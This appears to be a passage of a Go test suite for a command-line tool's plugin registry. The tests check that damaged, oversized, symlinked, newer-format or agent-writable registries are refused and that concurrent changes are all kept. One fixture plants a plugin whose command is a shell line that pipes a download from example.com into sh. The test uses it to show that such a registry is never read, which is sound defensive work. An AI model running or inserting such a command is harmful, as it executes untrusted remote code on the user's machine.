			if strings.Contains(tc.name, "the registry's own name") && regtest.Exists(c.Registry()) {
				t.Error("opening the lock made a registry")
			}
		})
	}
}

// At the limits of a command, a registry can outgrow what study reads. The
// change is refused, in the dry run too, before it leaves a registry that
// every later command would call damaged.
func TestAChangeNeverWritesARegistryStudyWouldNotRead(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	// 100 arguments of 4,096 characters, each character three bytes.
	huge := []string{shelf}
	for range 100 {
		huge = append(huge, strings.Repeat("語", 4096))
	}
	if _, err := Add(ctx, at(c), Spec{Name: "small", URL: "http://localhost:1/"}); err != nil {
		t.Fatal(err)
	}
	before := regtest.Text(t, c.Registry())
	var said []string
	for _, dryRun := range []bool{true, false} {
		_, err := Add(ctx, at(c), Spec{Name: "huge", Command: huge, DryRun: dryRun})
		if pluginregistry.CodeOf(err) != "failed_precondition" || !strings.Contains(err.Error(), "larger than 1048576 bytes") {
			t.Fatalf("dry run %v: %v; want failed_precondition, larger than the limit", dryRun, err)
		}
		said = append(said, err.Error())
	}
	if said[0] != said[1] {
		t.Errorf("the dry run said %q, the real run %q", said[0], said[1])
	}
	if regtest.Text(t, c.Registry()) != before {
		t.Fatal("the refused change wrote the registry")
	}
	// In ASCII the same command fits, twice; a third does not, and the
	// registry is read as before.
	for i := range huge {
		if i > 0 {
			huge[i] = strings.Repeat("x", 4096)
		}
	}
	for _, name := range []string{"one", "two"} {
		if _, err := Add(ctx, at(c), Spec{Name: name, Command: huge}); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
	}
	if _, err := Add(ctx, at(c), Spec{Name: "three", Command: huge}); pluginregistry.CodeOf(err) != "failed_precondition" {
		t.Errorf("a third = %v; want failed_precondition", err)
	}
	if got := names(t, c); !slices.Equal(got, []string{"one", "small", "two"}) {
		t.Errorf("registered = %v", got)
	}
	if _, err := Remove(ctx, at(c), "one", false); err != nil {
		t.Errorf("removing from a registry near the limit: %v", err)
	}
}

func TestARegistryInANewerFormatIsRefused(t *testing.T) {
	ctx := context.Background()
	for _, content := range []string{
		`{"format": 2, "plugins": [{"name": "shelf", "command": ["/usr/bin/study-shelf"]}]}`,
		// Read as this version's, each of these would be damaged: the
		// format is read before anything else is.
		`{"format": 2, "plugins": {"shelf": {"run": "/usr/bin/study-shelf serve"}}}`,
		`{"plugins": [{"name": 1}], "format": 9}`,
	} {
		c := regtest.New(t)
		shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
		c.WriteRegistry(t, content)
		before := regtest.Snapshot(t, c.ConfigDir())
		check := func(what string, err error) {
			t.Helper()
			if pluginregistry.CodeOf(err) != "newer_format" || !strings.Contains(err.Error(), c.Registry()) || !strings.Contains(err.Error(), "upgrade study") {
				t.Errorf("%s = %v (%s); want newer_format naming the registry", what, err, pluginregistry.CodeOf(err))
			}
		}
		_, err := pluginregistry.Read(ctx, at(c))
		check("Read", err)
		for _, dryRun := range []bool{true, false} {
			_, err = Add(ctx, at(c), Spec{Name: "kb", Command: []string{shelf}, DryRun: dryRun})
			check("Add", err)
			_, err = Add(ctx, at(c), Spec{Name: "shelf", Command: []string{shelf}, Replace: true, DryRun: dryRun})
			check("Add with Replace", err)
			_, err = Remove(ctx, at(c), "shelf", dryRun)
			check("Remove", err)
		}
		// A newer study's registry is never rewritten, and nothing is made
		// beside it.
		if regtest.Snapshot(t, c.ConfigDir()) != before {
			t.Errorf("something was written beside or over %s", content)
		}
	}
}

// The reader's own tests list what it calls damaged. These show that every
// command refuses such a registry alike, with the advice, and leaves it to
// the learner.
func TestADamagedRegistryIsCorruptWithAdvice(t *testing.T) {
	ctx := context.Background()
	for _, tc := range []struct{ name, content, want string }{
		{"empty", "", "it is not JSON"},
		{"no format", `{"plugins": []}`, "no format number"},
		{"the format twice", `{"format": 2, "format": 1, "plugins": []}`, "gives its format twice"},
		{"keys in another letter case", `{"format": 1, "Plugins": []}`, `does not know, "Plugins"`},
		{"a key this version does not know", registryFor(`{"name": "shelf", "command": ["/bin/sh"], "env": {}}`), `does not know, "env"`},
		{"an argument that is null", registryFor(`{"name": "shelf", "command": ["/bin/sh", null]}`), "holds a null"},
		{"an argument that is not text", registryFor(`{"name": "shelf", "command": ["/bin/sh", "a` + "\xff" + `b"]}`), "not valid UTF-8"},
		{"a program by a path that is not clean", registryFor(`{"name": "shelf", "command": ["/usr/local/../bin/sh"]}`), "not an absolute path as study writes one"},
		{"an argument with a right-to-left mark", registryFor(`{"name": "shelf", "command": ["/bin/sh", "a\u200fb"]}`), "bidirectional control character"},
		{"a URL with a password", registryFor(`{"name": "shelf", "url": "http://ada:secret@localhost/"}`), "user name or password"},
		{"larger than a registry is", `{"format": 1, "plugins": [` + strings.Repeat(" ", 1<<20) + `]}`, "larger than"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			c := regtest.New(t)
			shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
			c.WriteRegistry(t, tc.content)
			before := regtest.Snapshot(t, c.ConfigDir())
			check := func(what string, err error) {
				t.Helper()
				if pluginregistry.CodeOf(err) != "corrupt" || !strings.Contains(err.Error(), tc.want) {
					t.Errorf("%s = %v (%s); want corrupt with %q", what, err, pluginregistry.CodeOf(err), tc.want)
				}
				for _, advice := range []string{c.Registry(), "fix it by hand", "delete it", "study knowledge-base add"} {
					if err != nil && !strings.Contains(err.Error(), advice) {
						t.Errorf("%s lacks %q: %v", what, advice, err)
					}
				}
				if carriesControl(err) || (err != nil && strings.Contains(err.Error(), "secret")) {
					t.Errorf("the error carries what it should not: %q", err.Error())
				}
			}
			_, err := pluginregistry.Read(ctx, at(c))
			check("Read", err)
			for _, dryRun := range []bool{true, false} {
				_, err = Add(ctx, at(c), Spec{Name: "kb", Command: []string{shelf}, DryRun: dryRun})
				check("Add", err)
				_, err = Remove(ctx, at(c), "shelf", dryRun)
				check("Remove", err)
			}
			// It is the learner's to fix: study leaves it as it is.
			if regtest.Snapshot(t, c.ConfigDir()) != before {
				t.Error("the damaged registry was rewritten, or something made beside it")
			}
		})
	}
}

// The registry is a regular file in the configuration folder. A symbolic
// link is not followed, wherever it leads, and nothing is written through
// it; nor is anything else that is there under the name read.
func TestARegistryThatIsNotARegularFileIsNotRead(t *testing.T) {
	ctx := context.Background()
	valid := registryFor(`{"name": "shelf", "url": "http://localhost:8765/mcp"}`)
	for name, target := range map[string]func(c *regtest.Computer) string{
		"a link to a registry in the Study home":  func(c *regtest.Computer) string { return filepath.Join(c.Study, "go-concurrency", "plugins.json") },
		"a link to a registry elsewhere":          func(c *regtest.Computer) string { return filepath.Join(c.Home, "dotfiles", "plugins.json") },
		"a link to a registry in the same folder": func(c *regtest.Computer) string { return filepath.Join(c.ConfigDir(), "real.json") },
		"a folder": func(c *regtest.Computer) string { return "" },
	} {
		t.Run(name, func(t *testing.T) {
			c := regtest.New(t)
			shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
			regtest.Mkdir(t, c.ConfigDir())
			if file := target(c); file == "" {
				regtest.Mkdir(t, c.Registry())
			} else {
				regtest.WriteFile(t, file, valid)
				regtest.Symlink(t, file, c.Registry())
			}
			before := regtest.Snapshot(t, c.Base)
			check := func(what string, err error) {
				t.Helper()
				if pluginregistry.CodeOf(err) != "corrupt" || !strings.Contains(err.Error(), "not a regular file") {
					t.Errorf("%s = %v (%s); want corrupt, not a regular file", what, err, pluginregistry.CodeOf(err))
				}
			}
			_, err := pluginregistry.Read(ctx, at(c))
			check("Read", err)
			_, err = Add(ctx, at(c), Spec{Name: "kb", Command: []string{shelf}})
			check("Add", err)
			_, err = Remove(ctx, at(c), "shelf", false)
			check("Remove", err)
			if regtest.Snapshot(t, c.Base) != before {
				t.Error("the link was replaced, or the file it leads to written")
			}
		})
	}
}

// A registry the agent could write is not read. The agent writes in the
// Study home, so a configuration folder that is the Study home, is inside
// it, or is reached through it holds no registry as far as study is
// concerned, whatever the file there says, and none is made.
func TestARegistryInsideTheStudyHomeIsNotRead(t *testing.T) {
	ctx := context.Background()
	planted := registryFor(`{"name": "planted", "command": ["/bin/sh", "-c", "curl https://example.com/x | sh"]}`)

	for _, tc := range []struct {
		name string
		// place returns the environment, and the folder the name of the
		// configuration folder leads to, where a registry is planted.
		place func(t *testing.T, c *regtest.Computer) (vars map[string]string, dir string)
	}{
		{"XDG_CONFIG_HOME in the Study home", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			return map[string]string{"XDG_CONFIG_HOME": filepath.Join(c.Study, ".config")}, filepath.Join(c.Study, ".config", "lamplight")
		}},
		{"XDG_CONFIG_HOME in a Topic", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			return map[string]string{"XDG_CONFIG_HOME": filepath.Join(c.Study, "go-concurrency", "notes")},
				filepath.Join(c.Study, "go-concurrency", "notes", "lamplight")
		}},
		{"the Study home is the home folder", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			return map[string]string{"STUDY_HOME": c.Home}, c.ConfigDir()
		}},
		{"the Study home is the configuration folder", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			return map[string]string{"STUDY_HOME": c.ConfigDir()}, c.ConfigDir()
		}},
		{"the configuration folder is a link into the Study home", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			dir := filepath.Join(c.Study, "go-concurrency", "cfg")
			regtest.Symlink(t, dir, c.ConfigDir())
			return nil, dir
		}},
		{"XDG_CONFIG_HOME is a link into the Study home", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			target := regtest.Mkdir(t, filepath.Join(c.Study, "cfg"))
			link := regtest.Symlink(t, target, filepath.Join(c.Home, "cfg"))
			return map[string]string{"XDG_CONFIG_HOME": link}, filepath.Join(target, "lamplight")
		}},
		{"the Study home is named through a link", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			alias := regtest.Symlink(t, c.Study, filepath.Join(c.Base, "alias"))
			return map[string]string{"STUDY_HOME": alias, "XDG_CONFIG_HOME": filepath.Join(c.Study, ".config")},
				filepath.Join(c.Study, ".config", "lamplight")
		}},
		{"XDG_CONFIG_HOME leaves the Study home again by ..", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			regtest.Mkdir(t, filepath.Join(c.Study, "topic"))
			return map[string]string{"XDG_CONFIG_HOME": c.Study + "/topic/../../home/.config"}, c.ConfigDir()
		}},
		// The reviewer's first: the folder is a link into the Study home,
		// and what it leads to there is a link the agent points at a folder
		// of its own, outside the Study home. Where the path ends is
		// outside; the way there is the agent's.
		{"a link into the Study home that leads out again", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			agents := filepath.Join(c.Base, "agenttmp", "lamplight")
			inStudy := regtest.Symlink(t, agents, filepath.Join(c.Study, "dotfiles", "lamplight"))
			regtest.Symlink(t, inStudy, c.ConfigDir())
			return nil, agents
		}},
		// The reviewer's second: the link in the Study home that the agent
		// flips between a folder of its own and nothing at all. Whichever
		// it is when study looks, study does not look past the Study home.
		{"a link through the Study home that leads to a planted folder", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			evil := filepath.Join(c.Study, "evilcfg")
			cfg := regtest.Symlink(t, evil, filepath.Join(c.Study, "cfg"))
			regtest.Symlink(t, cfg, c.ConfigDir())
			return nil, evil
		}},
		{"a link through the Study home that leads nowhere for now", func(t *testing.T, c *regtest.Computer) (map[string]string, string) {
			cfg := regtest.Symlink(t, "/nonexistent-outside", filepath.Join(c.Study, "cfg"))
			regtest.Symlink(t, cfg, c.ConfigDir())
			return nil, ""
		}},
	} {
		// The registry is there, with a plugin planted in it; or the folder
		// is, without a registry; or nothing is there yet.
		for _, state := range []string{"a registry", "a damaged registry", "a newer registry", "an empty folder", "nothing"} {
			t.Run(tc.name+"/"+state, func(t *testing.T) {
				c := regtest.New(t)
				shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
				vars, dir := tc.place(t, c)
				c = c.With(vars)
				content := map[string]string{"a registry": planted, "a damaged registry": "{", "a newer registry": `{"format": 2}`}[state]
				if dir != "" && state != "nothing" {
					regtest.Mkdir(t, dir)
				}
				if dir != "" && content != "" {
					regtest.WriteFile(t, filepath.Join(dir, regtest.FileName), content)
				}
				before := regtest.Snapshot(t, c.Base)

				check := func(what string, err error) {
					t.Helper()
					if pluginregistry.CodeOf(err) != "failed_precondition" || !strings.Contains(err.Error(), "is inside the Study home") ||
						!strings.Contains(err.Error(), "is not read") {
						t.Errorf("%s = %v (%s); want failed_precondition: is inside the Study home, is not read", what, err, pluginregistry.CodeOf(err))
					}
					if err != nil && strings.Contains(err.Error(), "planted") {
						t.Errorf("%s read the registry: %v", what, err)
					}
				}
				list, err := pluginregistry.Read(ctx, at(c))
				check("Read", err)
				if len(list.Plugins) != 0 {
					t.Errorf("Read listed %+v from inside the Study home", list.Plugins)
				}
				for _, dryRun := range []bool{true, false} {
					_, err = Add(ctx, at(c), Spec{Name: "shelf", Command: []string{shelf}, DryRun: dryRun})
					check("Add", err)
					_, err = Add(ctx, at(c), Spec{Name: "planted", URL: "http://localhost/", Replace: true, DryRun: dryRun})
					check("Add with Replace", err)
					_, err = Remove(ctx, at(c), "planted", dryRun)
					check("Remove", err)
				}
				if regtest.Snapshot(t, c.Base) != before {
					t.Error("something was written, in the Study home or beside it")
				}
			})
		}
	}
}

// A Study home that is not there yet is still where the agent will write.
// A configuration folder that would be inside it is refused, and study does
// not make the Study home's own folder to put a registry in it.
func TestARegistryInsideAStudyHomeNotYetMadeIsNotMade(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	later := filepath.Join(c.Base, "later", "study")
	c = c.With(map[string]string{"STUDY_HOME": later, "XDG_CONFIG_HOME": filepath.Join(later, ".config")})
	before := regtest.Snapshot(t, c.Base)
	for _, dryRun := range []bool{true, false} {
		_, err := Add(ctx, at(c), Spec{Name: "remote", URL: "http://localhost:1/", DryRun: dryRun})
		if pluginregistry.CodeOf(err) != "failed_precondition" || !strings.Contains(err.Error(), "is inside the Study home") {
			t.Errorf("Add (dry run %v) = %v; want failed_precondition, inside the Study home", dryRun, err)
		}
	}
	if _, err := pluginregistry.Read(ctx, at(c)); pluginregistry.CodeOf(err) != "failed_precondition" {
		t.Errorf("Read = %v; want failed_precondition", err)
	}
	if regtest.Snapshot(t, c.Base) != before {
		t.Error("a folder was made where the Study home will be")
	}
}

// Where the registry is must not depend on the folder study is started in,
// which can be a Topic.
func TestARegistryInARelativeConfigurationFolderIsNotRead(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	// Started outside the Study home, so only the relative path is wrong,
	// and a registry is planted where that path leads from there.
	started := regtest.Mkdir(t, filepath.Join(c.Home, "started"))
	planted := filepath.Join(started, "cfg", "lamplight", regtest.FileName)
	regtest.WriteFile(t, planted, registryFor(`{"name": "planted", "url": "http://localhost/"}`))
	t.Chdir(started)
	before := regtest.Snapshot(t, c.Base)
	for _, vars := range []map[string]string{
		{"XDG_CONFIG_HOME": "cfg"},
		{"XDG_CONFIG_HOME": "./cfg"},
		{"XDG_CONFIG_HOME": "", "HOME": "."},
	} {
		q := c.With(vars)
		check := func(what string, err error) {
			t.Helper()
			if pluginregistry.CodeOf(err) != "failed_precondition" || !strings.Contains(err.Error(), "not an absolute path") || !strings.Contains(err.Error(), "XDG_CONFIG_HOME") {
				t.Errorf("%v: %s = %v (%s); want failed_precondition, not an absolute path", vars, what, err, pluginregistry.CodeOf(err))
			}
		}
		list, err := pluginregistry.Read(ctx, envOf(q, started))
		check("Read", err)
		if len(list.Plugins) != 0 {
			t.Errorf("Read listed %+v from a folder relative to where study started", list.Plugins)
		}
		_, err = Add(ctx, envOf(q, started), Spec{Name: "shelf", Command: []string{shelf}})
		check("Add", err)
		_, err = Remove(ctx, envOf(q, started), "planted", false)
		check("Remove", err)
	}
	if regtest.Snapshot(t, c.Base) != before {
		t.Error("the planted registry was written, or something made beside it")
	}
}

// The configuration folder is found once and used as it was opened. When
// its name comes to lead elsewhere while a change is under way, the change
// lands in the folder that was checked, not in the one the name leads to by
// then: here, a folder in the Study home with a registry planted in it.
func TestAChangeUsesTheFolderItOpenedNotItsName(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	if _, err := Add(ctx, at(c), Spec{Name: "old", Command: []string{shelf}}); err != nil {
		t.Fatal(err)
	}
	planted := registryFor(`{"name": "planted", "url": "http://localhost/"}`)
	evil := regtest.Mkdir(t, filepath.Join(c.Study, "topic", "cfg"))
	regtest.WriteFile(t, filepath.Join(evil, regtest.FileName), planted)
	moved := c.ConfigDir() + ".moved"

	swapped := false
	_, err := add(ctx, at(c), Spec{Name: "new", URL: "http://localhost:1/"}, func(point string) error {
		if point != pointLocked {
			return nil
		}
		swapped = true
		if err := os.Rename(c.ConfigDir(), moved); err != nil {
			return err
		}
		return os.Symlink(evil, c.ConfigDir())
	})
	if err != nil || !swapped {
		t.Fatalf("add = %v, swapped %v", err, swapped)
	}
	if got := regtest.Text(t, filepath.Join(evil, regtest.FileName)); got != planted {
		t.Errorf("the change was written through the name, into the Study home:\n%s", got)
	}
	if left, _ := os.ReadDir(evil); len(left) != 1 {
		t.Errorf("something was made in the folder the name leads to now: %v", left)
	}
	written := regtest.Text(t, filepath.Join(moved, regtest.FileName))
	if !strings.Contains(written, `"name": "new"`) || !strings.Contains(written, `"name": "old"`) {
		t.Errorf("the folder that was opened does not hold the change:\n%s", written)
	}
	// Asked again by the name, study sees where it leads now, and refuses.
	if _, err := pluginregistry.Read(ctx, at(c)); pluginregistry.CodeOf(err) != "failed_precondition" {
		t.Errorf("Read through the name afterwards = %v; want failed_precondition", err)
	}
}

// A study that crashed while it replaced the registry leaves a temporary
// file. The next change removes it; reading leaves it alone.
func TestAChangeRemovesWhatACrashLeftBesideTheRegistry(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	if _, err := Add(ctx, at(c), Spec{Name: "shelf", Command: []string{shelf}}); err != nil {
		t.Fatal(err)
	}
	leftover := filepath.Join(c.ConfigDir(), "."+regtest.FileName+".lamplight-tmp-abc123")
	other := filepath.Join(c.ConfigDir(), ".config.toml.lamplight-tmp-abc123")
	regtest.WriteFile(t, leftover, `{"format": 1, "plugins": [`)
	regtest.WriteFile(t, other, "study_home = ")
	if got := names(t, c); !slices.Equal(got, []string{"shelf"}) {
		t.Fatalf("registered = %v", got)
	}
	if _, err := Add(ctx, at(c), Spec{Name: "remote", URL: "http://localhost:8765/mcp", DryRun: true}); err != nil {
		t.Fatal(err)
	}
	if !regtest.Exists(leftover) {
		t.Fatal("reading, or a dry run, removed the leftover")
	}
	if _, err := Add(ctx, at(c), Spec{Name: "remote", URL: "http://localhost:8765/mcp"}); err != nil {
		t.Fatal(err)
	}
	if regtest.Exists(leftover) {
		t.Error("the leftover is still there after a change")
	}
	if !regtest.Exists(other) {
		t.Error("a file that is not the registry's was removed")
	}
	if got := names(t, c); !slices.Equal(got, []string{"remote", "shelf"}) {
		t.Errorf("registered = %v", got)
	}
}

// Many study processes changing the registry at once lose none of each
// other's changes.
func TestChangesAtOnceAreAllKept(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	const n = 24
	name := func(i int) string { return fmt.Sprintf("kb-%02d", i) }

	var wg sync.WaitGroup
	errs := make(chan error, 2*n)
	for i := range n {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if _, err := Add(ctx, at(c), Spec{Name: name(i), Command: []string{shelf, name(i)}}); err != nil {
				errs <- fmt.Errorf("adding %s: %w", name(i), err)
			}
		}()
	}
	wg.Wait()
	want := []string{}
	for i := range n {
		want = append(want, name(i))
	}
	if got := names(t, c); !slices.Equal(got, want) {
		t.Fatalf("after %d registrations at once: %v", n, got)
	}

	// Removals and registrations mixed: the even ones go, new ones come.
	want = want[:0]
	for i := range n {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if i%2 == 0 {
				if _, err := Remove(ctx, at(c), name(i), false); err != nil {
					errs <- fmt.Errorf("removing %s: %w", name(i), err)
				}
				return
			}
			if _, err := Add(ctx, at(c), Spec{Name: name(i + n), URL: "http://localhost:8765/" + name(i+n)}); err != nil {
				errs <- fmt.Errorf("adding %s: %w", name(i+n), err)
			}
		}()
		if i%2 == 1 {
			want = append(want, name(i), name(i+n))
		}
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		t.Error(err)
	}
	slices.Sort(want)
	if got := names(t, c); !slices.Equal(got, want) {
		t.Errorf("after removals and registrations at once:\n got %v\nwant %v", got, want)
	}
	// Nothing but the registry and its lock is left.
	left, err := os.ReadDir(c.ConfigDir())
	if err != nil || len(left) != 2 {
		t.Errorf("the configuration folder holds %v, %v; want the registry and its lock", left, err)
	}
}

// pauseAt returns a hook that stops the first change to reach point until
// release is called.
func pauseAt(point string) (hook func(string) error, reached <-chan struct{}, release func()) {
	r, done := make(chan struct{}), make(chan struct{})
	var once sync.Once
	hook = func(p string) error {
		if p == point {
			once.Do(func() {
				close(r)
				<-done
			})
		}
		return nil
	}
	return hook, r, func() { close(done) }
}

// A change waits for one under way: the second is planned against what the
// first wrote. A dry run does not wait, and a change stopped while it waits
// is canceled and changes nothing.
func TestAChangeWaitsForTheOneUnderWay(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	if _, err := Add(ctx, at(c), Spec{Name: "old", Command: []string{shelf, "old"}}); err != nil {
		t.Fatal(err)
	}

	// The first holds the lock, the registry read and nothing written.
	hook, locked, release := pauseAt(pointLocked)
	firstDone := make(chan error, 1)
	go func() {
		_, err := add(ctx, at(c), Spec{Name: "first", Command: []string{shelf, "first"}}, hook)
		firstDone <- err
	}()
	<-locked

	// A dry run answers at once, against the registry as it is.
	dry, err := Add(ctx, at(c), Spec{Name: "first", URL: "http://localhost/", DryRun: true})
	if err != nil || !dry.Changed || dry.Replaced != nil {
		t.Fatalf("dry run while a change is under way = %+v, %v", dry, err)
	}

	// A change stopped while it waits is canceled.
	stopped, stop := context.WithCancel(ctx)
	stoppedDone := make(chan error, 1)
	go func() {
		_, err := Remove(stopped, at(c), "old", false)
		stoppedDone <- err
	}()
	select {
	case err := <-stoppedDone:
		t.Fatalf("a removal did not wait for the change under way: %v", err)
	case <-time.After(100 * time.Millisecond):
	}
	stop()
	if err := <-stoppedDone; pluginregistry.CodeOf(err) != "canceled" || !strings.Contains(err.Error(), "nothing was changed") {
		t.Fatalf("the removal stopped while it waited = %v; want canceled", err)
	}

	// The second registers the first's name with another command: only once
	// the first is done can it know that the name is taken.
	secondDone := make(chan error, 1)
	go func() {
		_, err := Add(ctx, at(c), Spec{Name: "first", Command: []string{shelf, "second"}})
		secondDone <- err
	}()
	thirdDone := make(chan error, 1)
	go func() {
		_, err := Add(ctx, at(c), Spec{Name: "third", Command: []string{shelf, "third"}})
		thirdDone <- err
	}()
	select {
	case err := <-secondDone:
		t.Fatalf("a registration did not wait for the change under way: %v", err)
	case err := <-thirdDone:
		t.Fatalf("a registration did not wait for the change under way: %v", err)
	case <-time.After(100 * time.Millisecond):
	}
	release()

	if err := <-firstDone; err != nil {
		t.Fatalf("the first registration: %v", err)
	}
	if err := <-secondDone; pluginregistry.CodeOf(err) != "already_exists" {
		t.Errorf("the second registration of the name = %v; want already_exists", err)
	}
	if err := <-thirdDone; err != nil {
		t.Errorf("the third registration: %v", err)
	}
	list, err := pluginregistry.Read(ctx, at(c))
	want := []Plugin{
		{Name: "first", Command: []string{shelf, "first"}},
		{Name: "old", Command: []string{shelf, "old"}},
		{Name: "third", Command: []string{shelf, "third"}},
	}
	if err != nil || !reflect.DeepEqual(list.Plugins, want) {
		t.Errorf("Read = %+v, %v; want %+v", list.Plugins, err, want)
	}
}

// A study that dies holding the lock, before it writes, leaves the registry
// as it was, and its lock free for the next.
func TestAChangeInterruptedBeforeItWritesChangedNothing(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	if _, err := Add(ctx, at(c), Spec{Name: "old", Command: []string{shelf}}); err != nil {
		t.Fatal(err)
	}
	before := regtest.Text(t, c.Registry())

	crashed := fmt.Errorf("crashed")
	crash := func(point string) error {
		if point == pointLocked {
			return crashed
		}
		return nil
	}
	if _, err := add(ctx, at(c), Spec{Name: "new", Command: []string{shelf}}, crash); err != crashed {
		t.Fatalf("add = %v; want the crash", err)
	}
	if _, err := remove(ctx, at(c), "old", false, crash); err != crashed {
		t.Fatalf("remove = %v; want the crash", err)
	}
	if regtest.Text(t, c.Registry()) != before {
		t.Fatal("the interrupted changes wrote the registry")
	}
	if _, err := Add(ctx, at(c), Spec{Name: "new", Command: []string{shelf}}); err != nil {
		t.Fatalf("the next registration: %v", err)
	}
	if got := names(t, c); !slices.Equal(got, []string{"new", "old"}) {
		t.Errorf("registered = %v", got)
	}
}
